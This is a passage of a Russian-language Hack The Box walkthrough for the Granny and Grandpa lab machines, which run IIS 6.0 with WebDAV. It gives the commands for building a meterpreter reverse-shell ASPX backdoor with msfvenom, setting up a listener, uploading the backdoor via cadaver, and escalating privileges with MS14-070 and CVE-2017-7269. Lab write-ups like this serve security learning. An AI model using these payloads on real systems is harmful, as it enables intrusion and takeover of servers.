–í—Å—è –ø—Ä–æ–±–ª–µ–º–∞ –≤ —Ç–æ–º, —á—Ç–æ `davtest` –ø–æ–ø—ã—Ç–∞–ª—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å —ç—Ç–∏ —Ñ–∞–π–ª—ã –≤ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–∞—Ç–∞–ª–æ–≥ `/localhost`. –ï—â–µ —Ä–∞–∑ –æ—Ç–∫—Ä—ã–≤ –∏—Å—Ç–æ—Ä–∏—é HTTP, —è —É–≤–∏–¥–µ–ª –∑–∞–ø—Ä–æ—Å `MKCOL` –Ω–∞ —Å–æ–∑–¥–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –∫–æ—Ç–æ—Ä—ã–π —Ç–∞–∫–∂–µ –ø—Ä–æ–≤–∞–ª–∏–ª—Å—è —Å –æ—à–∏–±–∫–æ–π 409. –í—ã–≥–ª—è–¥–µ–ª –æ–Ω —Ç–∞–∫.

```
MKCOL /localhost/DavTestDir_evilhacker/ HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 0
```

–ö–∞–∫ –Ω–µ—Ç—Ä—É–¥–Ω–æ –¥–æ–≥–∞–¥–∞—Ç—å—Å—è, –ø—Ä–æ–±–ª–µ–º–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–æ–ø—ã—Ç–∫–µ —Å–æ–∑–¥–∞—Ç—å –≤–ª–æ–∂–µ–Ω–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ `/DavTestDir_evilhacker` –≤–Ω—É—Ç—Ä–∏ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—â–µ–≥–æ —Ä–æ–¥–∏—Ç–µ–ª—è `/localhost`. –ù–µ –∑–Ω–∞—é, —É–º–µ–µ—Ç –ª–∏ —Ç–∞–∫ –¥–µ–ª–∞—Ç—å WebDAV –≤ –ø—Ä–∏–Ω—Ü–∏–ø–µ (—Å–ø–µ—Ü–∏—Ñ–∏–∫–∞—Ü–∏—é –±—ã–ª–æ —Å–º–æ—Ç—Ä–µ—Ç—å –ª–µ–Ω—å, –º–æ–∂–µ—Ç –≤ –∫–æ–º–º–µ–Ω–∞—Ç—Ä–∏—è—Ö –ø–æ–¥—Å–∫–∞–∂—É—Ç), –Ω–æ –µ—Å–ª–∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–æ–∑–¥–∞—Ç—å –æ–¥–Ω–æ—É—Ä–æ–≤–Ω–µ–≤—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é `/localhost`, –æ–Ω–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ—è–≤–∏—Ç—Å—è, –∏ –≤—Å–µ –≤—Å—Ç–∞–Ω–µ—Ç –Ω–∞ —Å–≤–æ–∏ –º–µ—Å—Ç–∞.

![burp-mkcol.png]({{ "/img/htb/boxes/grandparents/burp-mkcol.png" | relative_url }})
{: .center-image}

![burp-put.png]({{ "/img/htb/boxes/grandparents/burp-put.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∑–∏–ª—Å—è, –∞ —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –Ω–∞—à –ø–ª–∞–Ω –≤ —Å–∏–ª–µ, –∏ –º–æ–∂–Ω–æ –ø—Ä–∏—Å—Ç—É–ø–∞—Ç—å –∫ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.

## –®–µ–ª–ª –æ—Ç –∏–º–µ–Ω–∏ NT AUTHORITY\NETWORK SERVICE

–¢–µ–ø–µ—Ä—å —É —Ç–µ–±—è –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –≤—ã–±–æ—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∏ –≤—Å–µ –∑–∞–≤–∏—Å–∏—Ç —Ç–æ–ª—å–∫–æ –æ—Ç –∫–æ–Ω–µ—á–Ω–æ–π —Ü–µ–ª–∏ —Ç–≤–æ–µ–≥–æ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏—è –≤ —Å–∏—Å—Ç–µ–º—É.

* –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Ç—ã —Ç–æ—á–Ω–æ –∑–Ω–∞–µ—à—å, –≥–¥–µ –ª–µ–∂–∏—Ç —Ç–æ, —á—Ç–æ —Ç–µ–±–µ –Ω—É–∂–Ω–æ, –∏ —á—Ç–æ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ —Ö–≤–∞—Ç–∏—Ç –±–∞–∑–æ–≤—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≤ —Å–∏—Å—Ç–µ–º–µ, —Ç–æ –º–æ–∂–Ω–æ –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å—Å—è –ø—Ä–æ—Å—Ç—ã–º [–≤–µ–±-—à–µ–ª–ª–æ–º](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx), –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å –∫–æ—Ç–æ—Ä—ã–º –º–æ–∂–Ω–æ –ø—Ä—è–º–æ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞.
* –ï—Å–ª–∏ –∂–µ —Ç–µ–±–µ –Ω—É–∂–Ω–æ –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–µ–µ –æ—Å–º–æ—Ç—Ä–µ—Ç—å—Å—è –Ω–∞ —Ö–æ—Å—Ç–µ, —Ç–æ–≥–¥–∞ —Ç–≤–æ–∏–º –≤—ã–±–æ—Ä–æ–º –º–æ–∂–µ—Ç —Å—Ç–∞—Ç—å —Ç–æ—Ç –∂–µ —Å–∞–º—ã–π –≤–µ–±-—à–µ–ª–ª –≤ —Å–≤—è–∑–∫–µ [—Å –ø–µ–π–ª–æ–∞–¥–æ–º](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) –Ω–∞ PowerShell, —á—Ç–æ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –¥–∞—Ä—É–µ—Ç —Ç–µ–±–µ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª. –î–∞–ª–µ–µ –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—ã–≤–æ–¥ `systeminfo` —Å –ø–æ–º–æ—â—å—é –∫–∞–∫–æ–≥–æ-–Ω–∏–±—É–¥—å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)-–∞ –¥–ª—è Windows.
* –ù—É –∞ –µ—Å–ª–∏ —Ç–≤–æ—è —Ü–µ–ª—å ‚Äî –ø–æ–ª–Ω—ã–π –∑–∞—Ö–≤–∞—Ç –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ —Ç–∞—á–∫–æ–π —Å —ç—Å–∫–∞–ª–∞—Ü–∏–µ–π –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –¥–æ –∞–¥–º–∏–Ω–∞, —Ç–æ–≥–¥–∞ meterpreter ‚Äî —Ç–≤–æ–π –ø—É—Ç—å.

–ö–æ–Ω–µ—á–Ω–æ, –º—ã –≤—ã–±–µ—Ä–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π –≤–∞—Ä–∏–∞–Ω—Ç.

### –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–µ–π–ª–æ–∞–¥–∞

–° –ø–æ–º–æ—â—å—é `msfvenom` —Å–æ–∑–¥–∞–¥–∏–º –±–µ–∫–¥–æ—Ä —Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π meterpreter –¥–ª—è 32-–±–∏—Ç–Ω–æ–π –≤–µ—Ä—Å–∏–∏ Windows –≤ —Ñ–æ—Ä–º–∞—Ç–µ `aspx`.

```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform win LHOST=10.10.14.10 LPORT=31337 -f aspx > meterpreter/m.aspx
```

–î–∞–ª–µ–µ —è —Å–æ–∑–¥–∞–º —Å–∫—Ä–∏–ø—Ç –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ —Å–ª—É—à–∞—Ç–µ–ª—è Metasploit, —á—Ç–æ–±—ã –Ω–µ –≤–≤–æ–¥–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –∫–∞–∂–¥—ã–π —Ä–∞–∑ –≤—Ä—É—á–Ω—É—é –≤ –∫–æ–Ω—Å–æ–ª–∏ MSF.

```
# meterpreter/l.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 31337
set ExitOnSession false
exploit -j -z
```

### cadaver

–í Kali –µ—Å—Ç—å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Å –∂—É—Ç–∫–æ–≤–∞—Ç—ã–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º cadaver (—Ç–æ –µ—Å—Ç—å ¬´—Ç—Ä—É–ø¬ª) ‚Äî —ç—Ç–æ –∫–æ–Ω—Å–æ–ª—å–Ω—ã–π WebDAV-–∫–ª–∏–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –æ–±–ª–µ–≥—á–∞–µ—Ç –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å WebDAV –∏–∑ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏.

–Ø –∫–æ–ø–∏—Ä—É—é —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –≤ `msfvenom` –±–µ–∫–¥–æ—Ä –≤ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª `m.txt`, –∑–∞–≥—Ä—É–∂—É –µ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–µ—Ä–µ–∏–º–µ–Ω—É—é –≤ `m.aspx` –≤ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–π —Å–µ—Å—Å–∏–∏ `cadaver`.

```
root@kali:~# cp meterpreter/m.aspx m.txt
root@kali:~# cadaver  http://10.10.10.15
dav:/> put m.txt
dav:/> move m.txt m.aspx
```

![cadaver.png]({{ "/img/htb/boxes/grandparents/cadaver.png" | relative_url }})
{: .center-image}

–¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –ø–æ–¥–Ω–∏–º–∞—Ç—å —Å–ª—É—à–∞—Ç–µ–ª—è Metasploit –∏ –∑–∞–ø—É—Å–∫–∞—Ç—å —Å–∞–º —Ñ–∞–π–ª `m.aspx` –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–ø—Ä–æ—Å—Ç–æ –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –∫ –Ω–µ–º—É –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞).

```
root@kali:~# msfconsole -qr meterpreter/l.rc
```

![msf-granny-launch-listener.png]({{ "/img/htb/boxes/grandparents/msf-granny-launch-listener.png" | relative_url }})
{: .center-image}

–ò –≤–æ—Ç —É –Ω–∞—Å —É–∂–µ –µ—Å—Ç—å —Å–µ—Å—Å–∏—è meterpreter –æ—Ç –∏–º–µ–Ω–∏ NT AUTHORITY\NETWORK SERVICE.

–ö —Å–ª–æ–≤—É, –≤—Å–µ —ç—Ç–æ –º–æ–∂–Ω–æ –±—ã–ª–æ –ø—Ä–æ–¥–µ–ª–∞—Ç—å –æ–¥–Ω–∏–º –∫–ª–∏–∫–æ–º ‚Äî —Å –ø–æ–º–æ—â—å—é –º–æ–¥—É–ª—è `exploit/windows/iis/iis_webdav_upload_asp` –¥–ª—è Metasploit, –∫–æ—Ç–æ—Ä—ã–π –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä—É–µ—Ç –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å—Å.

## –®–µ–ª–ª –æ—Ç –∏–º–µ–Ω–∏ NT AUTHORITY\SYSTEM

–î–∞–ª–µ–µ –¥–µ–ª–æ —Ç–µ—Ö–Ω–∏–∫–∏: –∑–∞–ø—É—Å—Ç–∏–º —Å–æ–≤–µ—Ç—á–∏–∫ –ø–æ –ª–æ–∫–∞–ª—å–Ω—ã–º —É—è–∑–≤–∏–º–æ—Å—Ç—è–º –∏ –≤—ã–±–µ—Ä–µ–º –Ω–∞—É–≥–∞–¥ –ø–µ—Ä–≤—ã–π –ø–æ–ø–∞–≤—à–∏–π—Å—è —ç–∫—Å–ø–ª–æ–∏—Ç ‚Äî¬†–±–ª–∞–≥–æ, —Ç–∞—á–∫–∞ —Å—Ç–∞—Ä–∞—è –∏ –≤—ã–±–æ—Ä –≤–µ–ª–∏–∫.

![msf-granny-exploit-suggester.png]({{ "/img/htb/boxes/grandparents/msf-granny-exploit-suggester.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ –º–∏–Ω—É—Ç–Ω–æ–≥–æ –æ–∂–∏–¥–∞–Ω–∏—è 29 —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –±—ã–ª–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω—ã, –∏ 7 –∏–∑ –Ω–∏—Ö –ø–æ–¥–æ—à–ª–∏ —Å –≤—ã—Å–æ–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å—é.

![msf-granny-privesc.png]({{ "/img/htb/boxes/grandparents/msf-granny-privesc.png" | relative_url }})
{: .center-image}

–Ø –≤—ã–±—Ä–∞–ª [MS14-070](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-070) ‚Äî —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤–∏–Ω–¥–æ–≤–æ–≥–æ —Å—Ç–µ–∫–∞ TCP/IP. –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —Å –ø–æ–º–æ—â—å—é Metasploit –∑–∞–Ω—è–ª–æ —Å—á–∏—Ç–∞–Ω–Ω—ã–µ —Å–µ–∫—É–Ω–¥—ã, –∏ —è –ø–æ–ª—É—á–∏–ª –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª.

–ú–∞–≥–∏—è Metasploit ‚Äî¬†—ç—Ç–æ, –∫–æ–Ω–µ—á–Ω–æ, –∫—Ä—É—Ç–æ, –æ–¥–Ω–∞–∫–æ –∑–∞ –∫–∞–∂—É—â–µ–π—Å—è –ø—Ä–æ—Å—Ç–æ—Ç–æ–π —á–∞—Å—Ç–æ —Å–∫—Ä—ã–≤–∞—é—Ç—Å—è –¥–æ–≤–æ–ª—å–Ω–æ –Ω–µ—Ç—Ä–∏–≤–∏–∞–ª—å–Ω—ã–µ –ø–∞—Å—Å—ã —Å WinAPI. –ù–∞–ø—Ä–∏–º–µ—Ä, –Ω–∞ —Ñ–æ—Ä—É–º–µ Hack The Box –ª—é–¥–∏ —á–∞—Å—Ç–æ [–ø—Ä–∞–∫—Ç–∏–∫—É—é—Ç—Å—è](https://forum.hackthebox.eu/discussion/456/granny-privesc-ms14-070-without-meterpreter) —Å –ø–æ–≤—ã—à–µ–Ω–∏–µ–º –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –±–µ–∑ –ø–æ–º–æ—â–∏ meterpreter.

–ï—Å–ª–∏ –∑–∞—Å–ø–∞–≤–Ω–∏—Ç—å —à–µ–ª–ª –∏ —Å–ø—Ä–æ—Å–∏—Ç—å `whoami`, —Å–µ—Ä–≤–µ—Ä –æ—Ç–≤–µ—Ç–∏—Ç, —á—Ç–æ —Ç—ã –≤—Å–µ –µ—â–µ –æ–±–ª–∞–¥–∞–µ—à—å –ø—Ä–∞–≤–∞–º–∏ –Ω–µ –≤—ã—à–µ NETWORK SERVICE. –ü—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —ç—Ç–æ –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ –ø–µ–π–ª–æ–∞–¥ meterpreter –≤—Å–µ –µ—â–µ –∏–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω –≤ –ø–µ—Ä–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∫–æ—Ç–æ—Ä—ã–π –º—ã –∑–∞–∞—Ä–∫–∞–Ω–∏–ª–∏ –¥–æ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π. –î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∞–≤–∞ SYSTEM –∏–∑ –æ–±–æ–ª–æ—á–∫–∏ cmd, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –º–∏–≥—Ä–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –≤ –ø—Ä–æ—Ü–µ—Å—Å —Å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏.

![msf-granny-shell-whoami-fail.png]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-fail.png" | relative_url }})
{: .center-image}

–Ø –≤—ã–±—Ä–∞–ª `cidaemon.exe` —Å PID `3964` –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–æ—Å–∏—Ç–µ–ª—è –∏ –ø–æ–¥—Å–µ–ª–∏–ª—Å—è –∫ –Ω–µ–º—É.

![msf-granny-migrate.png]({{ "/img/htb/boxes/grandparents/msf-granny-migrate.png" | relative_url }})
{: .center-image}

–¢–µ–ø–µ—Ä—å –ø—Ä–∞–≤–∞ –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ.

![msf-granny-shell-whoami-success.png]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-success.png" | relative_url }})
{: .center-image}

–î–µ–ª–æ –∑–∞ –º–∞–ª—ã–º: –Ω–∞–π—Ç–∏ –∏ –≤—ã—Ç–∞—â–∏—Ç—å —Ö–µ—à–∏ (—Ñ–ª–∞–≥–∏) —é–∑–µ—Ä–∞ –∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞. –°–¥–µ–ª–∞—é —è —ç—Ç–æ —Å –ø–æ–º–æ—â—å—é meterpreter ‚Äî –∞ –∏–º–µ–Ω–Ω–æ –º–æ–¥—É–ª–µ–π `search` –∏ `download`.

![msf-granny-get-hashes.png]({{ "/img/htb/boxes/grandparents/msf-granny-get-hashes.png" | relative_url }})
{: .center-image}

–ù–∞–ø–æ—Å–ª–µ–¥–æ–∫, –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ —Ä–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å –û–°.

```
meterpreter > sysinfo
Computer        : GRANNY
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

–°—É–¥—è –ø–æ —Å–≤–µ–¥–µ–Ω–∏—è–º `sysinfo`, –Ω–∞—à–µ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–µ–Ω–∏–µ –æ 32-–±–∏—Ç–Ω–æ–π –ø—Ä–∏—Ä–æ–¥–µ Windows –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–æ—Å—å.

–ù–∞ —ç—Ç–æ–º –≤–∏—Ä—Ç—É–∞–ª–∫—É Granny —Å—á–∏—Ç–∞—é –ø—Ä–æ–π–¥–µ–Ω–Ω–æ–π.

![granny-trophy.png]({{ "/img/htb/boxes/grandparents/granny-trophy.png" | relative_url }})
{: .center-image}

–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ Grandpa.

# Grandpa

–≠—Ç—É —Ç–∞—á–∫—É (—Ä–µ–π—Ç–∏–Ω–≥ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ ‚Äî 4,5 –±–∞–ª–ª–æ–≤ –∏–∑ 10) —è –ø—Ä–æ–±–µ–≥—É –±—ã—Å—Ç—Ä–µ–µ –∏ –Ω–µ –±—É–¥—É —Ç–∞–∫ –ø–æ–¥—Ä–æ–±–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å—Å—è –Ω–∞ –∫–∞–∂–¥–æ–º –ø—É–Ω–∫—Ç–µ.

**4.5/10**
{: style="color: green; text-align: right;"}

[![grandpa-banner.png]({{ "/img/htb/boxes/grandparents/grandpa-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/13 "Hack The Box :: Grandpa")
{: .center-image}

![grandpa-info.png]({{ "/img/htb/boxes/grandparents/grandpa-info.png" | relative_url }})
{: .center-image}

## –†–∞–∑–≤–µ–¥–∫–∞

### Nmap

–¢–∞–∫ –∂–µ –≤ –¥–≤–∞ —ç—Ç–∞–ø–∞ –ø—Ä–æ–≤–µ–¥–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ Nmap.

```
root@kali:~# nmap -n -Pn -oA nmap/grandpa-initial 10.10.10.14
root@kali:~# cat nmap/grandpa-initial.nmap
...
Host is up (0.064s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
...
```

–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ–≤—Ç–æ—Ä—è—é—Ç—Å—è —Ç–æ—á—å-–≤-—Ç–æ—á—å.

```
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/grandpa-version 10.10.10.14 -p80
root@kali:~# cat nmap/grandpa-version.nmap
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 21 Dec 2019 16:49:20 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

## –í–µ–±

–ù–∞ –≥–ª–∞–≤–Ω–æ–π –≤–µ–±-—Å–∞–π—Ç–∞ –≤–∏—Å–∏—Ç —Ç–∞–∫–∞—è –∂–µ –∑–∞–≥–ª—É—à–∫–∞.

![web-grandpa-main-page.png]({{ "/img/htb/boxes/grandparents/web-grandpa-main-page.png" | relative_url }})
{: .center-image}

### WebDAV

–ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å—É—â–µ—Å—Ç–≤–µ–Ω–Ω–æ–µ –æ—Ç–ª–∏—á–∏–µ –º–µ–∂–¥—É –¥–≤—É–º—è —Ç–∞—á–∫–∞–º–∏, –ø–æ–∂–∞–ª—É–π, –≤ —Ç–∏–ø–∞—Ö –±—Ä–µ—à–µ–π WebDAV. –ù–∞ —ç—Ç–æ–π –º–∞—à–∏–Ω–µ –¥–æ—Å—Ç—É–ø –∫ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å –ø–æ–º–æ—â—å—é `PUT` –∑–∞–ø—Ä–µ—â–µ–Ω –¥–ª—è –ª—é–±—ã—Ö —Ç–∏–ø–æ–≤ —Ñ–∞–π–ª–æ–≤. –û–¥–Ω–∞–∫–æ, –ø–æ–º–Ω—è –æ –Ω–æ–º–µ—Ä–µ –≤–µ—Ä—Å–∏–∏ IIS, —è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è [–Ω–∞—à—É–º–µ–≤—à–∏–º](https://threatpost.ru/publicly-attacked-microsoft-iis-zero-day-unlikely-to-be-patched/21241/) –≤ —Å–≤–æ–µ –≤—Ä–µ–º—è —ç–∫—Å–ø–ª–æ–∏—Ç–æ–º –¥–ª—è [CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269). –û—Å–Ω–æ–≤—ã–≤–∞–µ—Ç—Å—è –æ–Ω –Ω–∞ –æ—à–∏–±–∫–µ —Ñ—É–Ω–∫—Ü–∏–∏ `ScStoragePathFromUrl`, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ –≤ —Å—Ç—Ä–æ–∫–µ –æ–¥–Ω–æ–≥–æ –∏–∑ —Ö–µ–¥–µ—Ä–æ–≤ –∑–∞–ø—Ä–æ—Å–∞ `PROPFIND` (–∏–∑ –∞—Ä—Å–µ–Ω–∞–ª–∞ WebDAV).

–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π PoC [–¥–æ—Å—Ç—É–ø–µ–Ω](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py) –Ω–∞ GitHub, –æ–¥–Ω–∞–∫–æ —è –ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–º –º–æ–¥—É–ª–µ–º Metasploit ‚Äî `iis_webdav_scstoragepathfromurl`.

![msf-grandpa-scstoragepathfromurl.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-scstoragepathfromurl.png" | relative_url }})
{: .center-image}

–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏ meterpreter —Ç—ã –º–æ–∂–µ—à—å —Å—Ç–æ–ª–∫–Ω—É—Ç—å—Å—è —Å –æ—à–∏–±–∫–æ–π –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞. –ü—Ä–∏—á–∏–Ω—ã –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏—è —ç—Ç–æ–≥–æ –±–∞–≥–∞ —Å—Ö–æ–∂–∏ —Å —Ç–µ–º–∏, —á—Ç–æ –º—ã –Ω–∞–±–ª—é–¥–∞–ª–∏ –≤ –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏ –ø—Ä–∏ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏–∏ Granny: –ø–µ–π–ª–æ–¥—É —Ç–µ—Å–Ω–æ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ, –≤ –∫–æ—Ç–æ—Ä–æ–º –æ–Ω —Å–∏–¥–∏—Ç.

–ß—Ç–æ–±—ã –≤—ã–π—Ç–∏ –∏–∑ —ç—Ç–æ–≥–æ –ø–æ–ª–æ–∂–µ–Ω–∏—è, —è —Å–Ω–æ–≤–∞ –≤—ã–∑–æ–≤—É Process List –∏ –º–∏–≥—Ä–∏—Ä—É—é –≤ —Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å, –∫–æ—Ç–æ—Ä—ã–π –æ–±–ª–∞–¥–∞–µ—Ç –Ω—É–∂–Ω—ã–º–∏ –º–Ω–µ –ø–æ–ª–Ω–æ–º–æ—á–∏—è–º–∏.

![msf-grandpa-migrate.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-migrate.png" | relative_url }})
{: .center-image}

–ö—Å—Ç–∞—Ç–∏, –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å, –≤ –∫–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å –±—ã–ª –ø—Ä–æ–≤–µ–¥–µ–Ω –ø–µ—Ä–≤–∏—á–Ω—ã–π –∏–Ω–∂–µ–∫—Ç, –º–æ–∂–Ω–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–æ–π `netstat` –¥–æ –º–∏–≥—Ä–∞—Ü–∏–∏ –∏ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π.

```
C:\windows\system32\inetsrv>netstat -vb
```

![msf-grandpa-shell-netstat.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-shell-netstat.png" | relative_url }})
{: .center-image}
